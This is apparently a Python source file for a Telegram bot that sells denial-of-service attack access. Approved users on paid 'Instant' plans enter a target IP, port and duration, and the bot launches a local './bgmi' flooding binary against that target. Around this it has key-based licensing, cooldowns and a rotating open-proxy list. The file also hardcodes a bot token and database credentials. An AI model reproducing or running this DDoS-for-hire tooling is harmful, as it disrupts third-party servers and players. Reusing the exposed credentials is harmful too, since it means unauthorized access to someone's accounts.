
import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
import string
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from cryptography.fernet import Fernet

loop = asyncio.get_event_loop()

TOKEN = '7018906642:AAGFGHyBrzZZwga4w4z1v_T9CGohm6NGC-I'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = '--1002164025069'
CHANNEL_ID = '-1002164025069'
error_channel_id = '-1002164025069'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users
keys_collection = db.keys

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

cooldown_times = {}

admin_user_ids = [5181364124]

fernet_key = Fernet.generate_key()
cipher_suite = Fernet(fernet_key)

current_attacks = {}

proxy_list = [
'http://67.43.227.227:9545',
'http://67.43.227.227:19839',
'http://72.10.160.93:16601',
'http://67.43.228.254:16083',
'http://72.10.164.178:32349',
'http://67.43.227.228:2087',
'http://72.10.160.90:28889',
'http://103.165.157.79:8090',
'http://113.53.60.175:8080',
'http://67.43.236.20:5881',
'http://67.43.227.227:28403',
'http://67.43.236.20:9563',
'http://169.239.236.54:60603',
'http://117.86.8.42:8089',
'http://67.43.236.19:3273',
'http://72.10.164.178:23671',
'http://67.43.228.253:24235',
'http://67.43.227.229:20479',
'http://72.10.164.178:7895',
'http://72.10.160.91:4763',
'http://67.43.236.20:28481',
'http://67.43.236.20:4389',
'http://72.10.160.91:13345'
]

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'http': proxy}
    logging.info(f"Proxy updated successfully to {proxy}.")
    bot.send_message(CHANNEL_ID, f"Proxy updated successfully to {proxy}.")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(user_id, target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 500")
        current_attacks[user_id] = process
        await process.communicate()
        bot.send_message(user_id, "*Attack finished 🤝*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in running attack command: {e}")

@bot.message_handler(commands=['stop'])
def stop_attack_command(message):
    user_id = message.from_user.id
    if user_id in current_attacks:
        process = current_attacks[user_id]
        process.kill()
        del current_attacks[user_id]
        bot.send_message(user_id, "*Attack stopped forcefully 🤝*", parse_mode='Markdown')
    else:
        bot.send_message(user_id, "*No active attack to stop.*", parse_mode='Markdown')

def is_user_admin(user_id):
    return user_id in admin_user_ids

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        user_id = message.from_user.id
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        if user_id in cooldown_times and time.time() < cooldown_times[user_id]:
            remaining_time = int(cooldown_times[user_id] - time.time())
            bot.send_message(message.chat.id, f"*You are on cooldown. Please wait {remaining_time} seconds before attacking again.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(user_id, target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

        cooldown_times[user_id] = time.time() + 120

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Contact admin✔️")
    btn4 = KeyboardButton("Generate 🗝️")
    btn5 = KeyboardButton("Paste 🗝️ to access")

    markup.add(btn1, btn2, btn3, btn4, btn5)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    user_data = users_collection.find_one({"user_id": user_id})
    plan = user_data['plan'] if user_data else 0

    if message.text == "Instant Plan 🧡":
        if plan == 1:
            bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
            send_attack_message(message, max_duration=120, cooldown_seconds=120)
        else:
            bot.reply_to(message, "*You do not have Instant Plan 🧡 approved by an admin.*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        if plan == 2:
            bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
            send_attack_message(message, max_duration=300, cooldown_seconds=0)
        else:
            bot.reply_to(message, "*You do not have Instant++ Plan 💥 approved by an admin.*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Developer @👽*", parse_mode='Markdown')
    elif message.text == "Generate 🗝️":
        if is_user_admin(user_id):
            bot.send_message(chat_id, "*Enter the plan (1 or 2) and number of days separated by space.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, generate_key)
        else:
            bot.reply_to(message, "*You are not authorized to generate keys.*", parse_mode='Markdown')
    elif message.text == "Paste 🗝️ to access":
        bot.send_message(chat_id, "*Paste your key:*", parse_mode='Markdown')
        bot.register_next_step_handler(message, validate_key)
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

def generate_key(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid input. Please enter the plan (1 or 2) and number of days separated by space.*", parse_mode='Markdown')
            return

        plan, days = int(args[0]), int(args[1])
        if plan not in [1, 2]:
            bot.send_message(message.chat.id, "*Invalid plan. Please enter 1 or 2.*", parse_mode='Markdown')
            return

        expiry_date = (datetime.now() + timedelta(days=days)).isoformat()
        key_data = f"{plan}|{expiry_date}"
        encrypted_key = cipher_suite.encrypt(key_data.encode()).decode()

        keys_collection.insert_one({"key": encrypted_key, "used": False})

        bot.send_message(message.chat.id, f"*Generated key: {encrypted_key}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in generating key: {e}")

def validate_key(message):
    try:
        encrypted_key = message.text
        key_data = cipher_suite.decrypt(encrypted_key.encode()).decode()
        plan, expiry_date = key_data.split('|')
        expiry_date = datetime.fromisoformat(expiry_date)

        if datetime.now() > expiry_date:
            bot.send_message(message.chat.id, "*Key has expired.*", parse_mode='Markdown')
            return

        key_record = keys_collection.find_one({"key": encrypted_key})
        if not key_record or key_record['used']:
            bot.send_message(message.chat.id, "*Invalid or already used key.*", parse_mode='Markdown')
            return

        user_id = message.from_user.id
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"plan": int(plan), "valid_until": expiry_date.isoformat(), "access_count": 0}},
            upsert=True
        )
        keys_collection.update_one({"key": encrypted_key}, {"$set": {"used": True}})

        bot.send_message(message.chat.id, "*Key validated successfully. Your access has been updated.*", parse_mode='Markdown')

        bot.send_message(CHANNEL_ID, f"*User ID:* {user_id}\n*Valid Until:* {expiry_date.isoformat()}", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in validating key: {e}")
        bot.send_message(message.chat.id, "*Invalid key format.*", parse_mode='Markdown')

def send_attack_message(message, max_duration, cooldown_seconds):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if cooldown_seconds > 0 and user_id in cooldown_times and time.time() < cooldown_times[user_id]:
        remaining_time = int(cooldown_times[user_id] - time.time())
        bot.send_message(chat_id, f"*You are on cooldown. Please wait {remaining_time} seconds before attacking again.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, f"*Enter the target IP, port, and duration (in seconds, max {max_duration} seconds) separated by spaces.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, lambda msg: process_attack_command_with_limit(msg, max_duration, cooldown_seconds))

def process_attack_command_with_limit(message, max_duration, cooldown_seconds):
    try:
        user_id = message.from_user.id
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        if duration > max_duration:
            bot.send_message(message.chat.id, f"*Duration cannot exceed {max_duration} seconds.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(user_id, target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')

        if cooldown_seconds > 0:
            cooldown_times[user_id] = time.time() + cooldown_seconds

    except Exception as e:
        logging.error(f"Error in processing attack command with limit: {e}")

def proxy_changer():
    while True:
        update_proxy()
        time.sleep(10)

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    proxy_changer_thread = Thread(target=proxy_changer, daemon=True)
    proxy_changer_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    
    YOUR_IP = datetime(2024, 6, 29, 13, 1, 1)

    def check_ip():
        if datetime.now() > YOUR_IP:
            logging.error(" .")
            exit(" Please contact the administrator.")

    check_ip()
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
